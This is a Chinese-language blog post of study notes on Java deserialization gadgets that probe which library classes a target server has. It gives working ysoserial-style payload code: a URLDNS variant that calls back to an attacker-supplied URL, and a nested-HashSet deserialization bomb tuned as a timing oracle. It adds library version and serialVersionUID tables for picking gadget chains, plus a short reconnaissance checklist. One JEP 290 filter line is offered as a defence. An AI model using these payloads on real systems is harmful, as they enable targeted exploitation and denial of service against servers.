# 构造java探测class反序列化gadget的思考

[构造java探测class反序列化gadget](https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247484178&idx=1&sn=228ccc3d624f2d64a6c1d51555c42eea&chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&mpshare=1&scene=23&srcid=1231zSEsxQMxcrllvqoBgmcY&sharer_sharetime=1640932147710&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd)

这篇文章是2021年最后一天读的，非常好。这让我对2022充满希望。谢谢师傅提供的好思路。

## urldns

通过urldns去判断是不是存在

```java
/**
* 生成我们需要的空类
**/
public static Class makeClass(String clazzName) throws Exception{
    ClassPool classPool = ClassPool.getDefault();
    CtClass ctClass = classPool.makeClass(clazzName);
    Class clazz = ctClass.toClass();
    ctClass.defrost();
    return clazz;
}
```

poc

```java
@Authors({ Authors.NOPOINT,Authors.C0NY1 })
public class FindClassByDNS implements ObjectPayload<Object> {
    public Object getObject(final String command) throws Exception {
        String[] cmds = command.split("\\|");
        if(cmds.length != 2){
            System.out.println("<url>|<class name>");
            return null;
        }
        String url = cmds[0];
        String clazzName = cmds[1];
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap();
        URL u = new URL(null, url, handler);
        // 以URL对象为key，以探测Class为value
        ht.put(u, makeClass(clazzName));//
        Reflections.setFieldValue(u, "hashCode", -1);
        return ht;
    }
}
```

**如果环境没有dns解析就不行咯**

## Dos

https://blog.csdn.net/fnmsd/article/details/115672540

https://blog.csdn.net/nevermorewo/article/details/100100048

https://github.com/jbloch/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/item85/DeserializationBomb.java

**通过构造特殊的多层嵌套HashSet，导致服务器反序列化的时间复杂度提升，消耗服务器所有性能，导致拒绝服务。在这个基础上，我选择消耗部分性能达到间接延时的作用，来探测class。**

```java
@Authors({ Authors.C0NY1 })
public class FindClassByBomb extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {
        int depth;
        String className = null;

        if(command.contains("|")){
            String[] x = command.split("\\|");
            className = x[0];
            depth = Integer.valueOf(x[1]);
        }else{
            className = command;
            depth = 28;
        }

        Class findClazz = makeClass(className);
        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();
        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();
            t1.add(findClazz);//不存在类就抛出异常
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }
} 
```

经过师傅的实战一般这个深度都在25到28之间，切记不要设置太大否则造成DOS。

不过可以通过jep290继续防御

```
-Djdk.serialFilter=maxarray=100000;maxdepth=20
```



## class checklist

要想在实战中使用，我们就需要事先去制作一份class的checklist备用。下面我通过diff maven中央仓库的统计的结果。最新的checklist和gadget都更新到ysoserial-for-woodpecker项目。

**6.1 CommonsCollections**

必须存在类：org.apache.commons.collections.functors.ChainedTransformer



|       版本范围       |                        漏洞版本                        | 判断类 | suid冲突 |
| :------------------: | :----------------------------------------------------: | :----: | :------: |
| >= 3.1 or = 20040616 |      org.apache.commons.collections.list.TreeList      |   是   |    无    |
|       >= 3.2.2       | org.apache.commons.collections.functors.FunctorUtils$1 |   否   |    无    |



**6.2 CommonsCollections4**

必须存在类：org.apache.commons.collections4.comparators.TransformingComparator

| 版本范围 | 漏洞版本 |                        判断类                        | suid冲突 |
| :------: | :------: | :--------------------------------------------------: | :------: |
|  >= 4.1  |    否    |  存在org.apache.commons.collections4.FluentIterable  |    无    |
|   4.0    |    否    | 不存在org.apache.commons.collections4.FluentIterable |    无    |



**6.3 CommonsBeanutils**

必须存在类：org.apache.commons.beanutils.BeanComparator



|             版本范围              | 漏洞版本 |                      判断类                       |       suid冲突       |
| :-------------------------------: | :------: | :-----------------------------------------------: | :------------------: |
|             >= 1.9.0              |    是    | 存在org.apache.commons.beanutils.BeanIntrospector | -2044202215314119608 |
|        1.7.0 <=  <= 1.8.3         |    是    |     存在org.apache.commons.collections.Buffer     | -3490850999041592962 |
|    >= 1.6 or = 20030211.134440    |    是    | 存在org.apache.commons.beanutils.ConstructorUtils | 2573799559215537819  |
| >= 1.5 or 20021128.082114 > 1.4.1 |    是    |  存在org.apache.commons.beanutils.BeanComparator  | 5123381023979609048  |

**6.4 c3p0**

必须存在：org.apache.commons.beanutils.BeanComparator



|            版本范围             | 漏洞版本 |                       判断类                        |       suid冲突       |
| :-----------------------------: | :------: | :-------------------------------------------------: | :------------------: |
|      0.9.5-pre9 ～ 0.9.5.5      |    是    |  存在com.mchange.v2.c3p0.test.AlwaysFailDataSource  | -2440162180985815128 |
| 0.9.2-pre2-RELEASE ~ 0.9.5-pre8 |    是    | 不存在com.mchange.v2.c3p0.test.AlwaysFailDataSource | 7387108436934414104  |



以c3p0为例子，我们判断的步骤应该是



1. 第一步判断com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase是否存在，若存在C3P0可用

2. 第二步判断com.mchange.v2.c3p0.test.AlwaysFailDataSource是否存在，存在说明是高版本，suid切换-2440162180985815128。否则切换7387108436934414104 



## 思考

1. Oracle jdk or Open jdk

2. 是jre还是jdk

3. 中间件类型（辅助构造回显/内存马）

4. 使用的web框架

5. BCEL classloader是否存在  **com.sun.org.apache.bcel.internal.util.ClassLoader**

6. 判断java版本是否低于<7u104（该版本可以00截断）

7. ......

本来想继续去寻找的可是有点累了，以后有时间去弄吧。。。。。respect 

参考

>[构造java探测class反序列化gadget](https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247484178&idx=1&sn=228ccc3d624f2d64a6c1d51555c42eea&chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&mpshare=1&scene=23&srcid=1231zSEsxQMxcrllvqoBgmcY&sharer_sharetime=1640932147710&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd)
